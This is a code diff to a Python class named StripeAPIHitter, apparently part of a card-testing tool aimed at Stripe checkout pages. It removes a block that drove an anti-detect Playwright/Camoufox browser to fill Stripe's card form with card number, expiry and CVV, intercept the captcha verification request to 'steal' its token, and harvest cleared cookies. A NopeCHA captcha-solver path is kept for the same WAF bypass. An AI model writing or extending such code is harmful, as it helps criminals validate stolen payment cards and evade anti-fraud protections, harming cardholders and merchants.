@@ -2063,56 +2063,11 @@ class StripeAPIHitter:
                                                 except Exception as _ne:
                                                     print(f"[DEBUG WAF] NopeCHA solver failed: {_ne}")
 
-                                            # ── PATH B: Playwright WAF Token Harvester ───────────────────────
-                                            # Launch Camoufox, fill the actual Stripe card form, submit it,
-                                            # intercept the verify_challenge POST to steal the captcha_response
-                                            # token that Camoufox's anti-detect fingerprint generates natively.
-                                            if not _trawl_captcha_token:
-                                                try:
-                                                    _card_raw_for_solver = f"{card.get('card','')}|{card.get('month','01')}|{card.get('year','30')}|{card.get('cvv','111')}"
-                                                    print(f"[DEBUG TRAWL WAF] Launching Playwright WAF solver on {checkout_page_url[:75]}...")
-                                                    _pw_token, _pw_body = await loop.run_in_executor(
-                                                        None,
-                                                        lambda: __import__(
-                                                            'waf_solver',
-                                                            fromlist=['solve_stripe_waf_token_sync']
-                                                        ).solve_stripe_waf_token_sync(
-                                                            checkout_page_url,
-                                                            _card_raw_for_solver,
-                                                            timeout=85.0,
-                                                            headless=True,
-                                                        )
-                                                    )
-                                                    if _pw_token:
-                                                        _trawl_captcha_token = _pw_token
-                                                        print(f"[DEBUG TRAWL WAF] Playwright WAF solver token len={len(_pw_token)}")
-                                                    else:
-                                                        # Fallback: passive /scrape to at least collect cookies
-                                                        try:
-                                                            _trawl_payload = {
-                                                                "url": checkout_page_url.split('#')[0],
-                                                                "maxTimeout": 30000,
-                                                                "wait": 5000,
-                                                            }
-                                                            _trawl_res = await loop.run_in_executor(None, lambda: _trawl_req2.post(
-                                                                f"{trawl_api_url.rstrip('/')}/scrape",
-                                                                json=_trawl_payload,
-                                                                timeout=35
-                                                            ))
-                                                            if _trawl_res and _trawl_res.status_code == 200:
-                                                                _trawl_cleared_cookies = _trawl_res.json().get("cookies") or []
-                                                                for _tc in _trawl_cleared_cookies:
-                                                                    _tc_n = _tc.get("name") if isinstance(_tc, dict) else ""
-                                                                    _tc_v = _tc.get("value") if isinstance(_tc, dict) else ""
-                                                                    if _tc_n and _tc_v:
-                                                                        _cffi_session.cookies.set(_tc_n, _tc_v, domain=".stripe.com", path="/")
-                                                            print(f"[DEBUG TRAWL WAF] token=False, fallback cookies={len(_trawl_cleared_cookies)}")
-                                                        except Exception:
-                                                            pass
-                                                except Exception as _tre:
-                                                    print(f"[DEBUG TRAWL WAF] Playwright WAF solver error: {_tre}")
+                                            # ── PATH B: Local Playwright / Camoufox Scraping REMOVED ───────────
+                                            # Pure API solvers (NopeCHA) only — zero headless browser overhead
+                                            pass
                                         except Exception as _twe:
-                                            print(f"[DEBUG TRAWL WAF] bypass failed: {_twe}")
+                                            print(f"[DEBUG WAF] solver pass failed: {_twe}")
 
 
 
